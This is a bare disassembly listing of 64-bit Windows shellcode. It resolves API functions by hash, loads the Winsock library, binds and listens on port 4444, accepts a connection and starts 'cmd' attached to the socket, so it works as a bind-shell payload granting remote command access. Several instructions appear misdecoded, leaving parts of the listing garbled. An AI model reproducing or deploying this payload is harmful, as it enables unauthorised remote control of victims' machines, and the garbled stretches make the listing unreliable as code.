0: cld 
1: and rsp, 0xfffffffffffffff0
5: call 0xca
10: push r9
12: push r8
14: push rdx
15: push rcx
16: push rsi
17: xor rdx, rdx
20: mov rdx, qword ptr gs:[rdx + 0x60]
25: mov rdx, qword ptr [rdx + 0x18]
29: mov rdx, qword ptr [rdx + 0x20]
33: mov rsi, qword ptr [rdx + 0x50]
37: movzx rcx, word ptr [rdx + 0x4a]
42: xor r9, r9
45: xor rax, rax
48: lodsb al, byte ptr [rsi]
49: cmp al, 0x61
51: jl 0x37
53: sub al, 0x20
55: ror r9d, 0xd
59: add r9d, eax
62: loop 0x2d
64: push rdx
65: push r9
67: mov rdx, qword ptr [rdx + 0x20]
71: mov eax, dword ptr [rdx + 0x3c]
74: add rax, rdx
77: mov eax, dword ptr [rax + 0x88]
83: test rax, rax
86: je 0xbf
88: add rax, rdx
91: push rax
92: mov ecx, dword ptr [rax + 0x18]
95: mov r8d, dword ptr [rax + 0x20]
99: add r8, rdx
102: jrcxz 0xbe
104: dec rcx
107: mov esi, dword ptr [r8 + rcx*4]
111: add rsi, rdx
114: xor r9, r9
117: xor rax, rax
120: lodsb al, byte ptr [rsi]
121: ror r9d, 0xd
125: jno 0xc0
127: add ecx, eax
129: cmp al, ah
131: jne 0x76
133: int3 
134: clc 
136: sbb byte ptr [rsp + rcx*2 + 3], bl
140: and al, 8
143: cmp r9d, r10d
146: jne 0x6c
148: pop rax
149: mov r8d, dword ptr [rax + 0x24]
153: add r8, rdx
156: mov cx, word ptr [r8 + rcx*2]
161: mov r8d, dword ptr [rax + 0x1c]
165: add r8, rdx
168: mov eax, dword ptr [r8 + rcx*4]
172: add rax, rdx
175: pop r8
177: pop r8
179: pop rsi
180: pop rcx
181: pop rdx
182: pop r8
184: pop r9
186: pop r10
188: sub rsp, 0x20
192: push r10
194: jmp rax
196: pop rax
197: pop r9
199: pop rdx
200: mov rdx, qword ptr [rdx]
203: jmp 0x27
208: pop rbp
209: movabs r14, 0x32335f327377
219: push r14
221: mov r14, rsp
224: sub rsp, 0x1a0
231: mov r13, rsp
234: movabs r12, 0x5c110002
244: push r12
246: mov r12, rsp
249: mov rcx, r14
252: mov r10d, 0x726774c
258: call rbp
260: mov rdx, r13
263: push 0x101
268: pop rcx
269: mov r10d, 0x6b8029
275: call rbp
277: push rax
278: push rax
279: xor r9, r9
282: xor r8, r8
285: inc rax
288: mov rdx, rax
291: inc rax
294: adc byte ptr [rsi - 0x2b], bl
297: sbb dword ptr [rax + rdi*8 + 0x41c18948], ecx
304: mov edx, 0xe0df0fea
309: call rbp
311: mov rdi, rax
314: push 0x10
316: pop r8
318: mov rdx, r12
321: mov rcx, rdi
324: mov r10d, 0x6737dbc2
330: call rbp
332: xor rdx, rdx
335: mov rcx, rdi
338: jl 0x1cf
340: mov r10d, 0xff38e9b7
346: call rbp
348: xor r8, r8
351: xor rdx, rdx
354: mov rcx, rdi
357: mov r10d, 0xe13bec74
363: call rbp
365: mov rcx, rdi
368: mov rdi, rax
371: push -0x16
373: xor edi, ebx
375: xor al, 0x41
377: mov edx, 0x614d6e75
382: call rbp
384: add rsp, 0x2a0
391: movabs r8, 0x646d63
401: push r8
403: push r8
405: mov rdx, rsp
408: push rdi
409: push rdi
410: push rdi
411: xor r8, r8
414: push 0xd
416: pop rcx
417: push r8
419: loop 0x1a1
421: mov word ptr [rsp + 0x54], 0x101
428: lea rax, [rsp + 0x18]
433: mov byte ptr [rax], 0x68
436: mov rsi, rsp
439: push rsi
440: push rax
441: sbb eax, dword ptr [rbp - 0x3021d48a]
447: scasd eax, dword ptr [rdi]
448: push r8
450: loop 0x22a
452: hlt 
454: pop rdx
455: push r8
457: push r8
459: inc r8
462: push r8
464: dec r8
467: mov r9, r8
470: mov rcx, r8
473: mov r10d, 0x863fcc79
479: call rbp
481: xor rdx, rdx
484: dec rdx
487: mov ecx, dword ptr [rsi]
489: mov r10d, 0x601d8708
495: call rbp
497: mov ebx, 0x56a2b5f0
502: mov r10d, 0x9dbd95a6
508: call rbp
510: add rsp, 0x28
514: cmp al, 6
517: jl 0x211
519: cmp bl, 0xe0
522: jne 0x211
524: mov ebx, 0x6f721347
529: jp 0x221
